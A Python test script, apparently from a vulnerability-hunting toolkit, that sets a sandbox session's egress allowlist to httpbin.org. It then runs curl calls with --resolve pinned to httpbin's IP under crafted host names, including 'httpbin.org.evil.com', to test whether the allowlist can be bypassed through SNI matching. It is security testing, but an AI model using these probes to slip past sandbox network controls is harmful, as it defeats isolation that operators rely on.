# -*- coding: utf-8 -*-
"""Phase4b: 白名单匹配边界测试(--resolve 绕过 DNS,按 SNI 判断)"""
import sys, time
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_BQJ2aL59BOiIDLDpm6guM4rpiJih"
HB_IP = "34.195.135.204"

GUEST = r'''
import subprocess
def curl(args):
    r = subprocess.run(['curl', '-s', '-m', '8', '-k'] + args, capture_output=True, text=True)
    print('---', ' '.join(args)[:150], flush=True)
    print('RC=%d OUT:%s ERR:%s' % (r.returncode, r.stdout[:300].replace(chr(10),' '), r.stderr[:250].replace(chr(10),' ')), flush=True)

# 基线: 白名单域名
curl(['--resolve', 'httpbin.org:443:34.195.135.204', 'https://httpbin.org/anything'])
# 子域(非白名单)
curl(['--resolve', 'a.httpbin.org:443:34.195.135.204', 'https://a.httpbin.org/'])
# 后缀拼接
curl(['--resolve', 'httpbin.org.evil.com:443:34.195.135.204', 'https://httpbin.org.evil.com/'])
# 前缀拼接(负控)
curl(['--resolve', 'evhttpbin.org:443:34.195.135.204', 'https://evhttpbin.org/'])
# 不同域(负控)
curl(['--resolve', 'example.com:443:34.195.135.204', 'https://example.com/'])
print('done', flush=True)
'''

code = "cat > /tmp/pg10.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg10.py"

if __name__ == "__main__":
    body = {"mode": "custom", "allowedDomains": ["httpbin.org"]}
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (SID, TEAM), body)
    print('set policy:', c, r[:200], flush=True)
    time.sleep(2)
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=90000)
    print('cmd:', c, flush=True)
    print(r[:5500], flush=True)
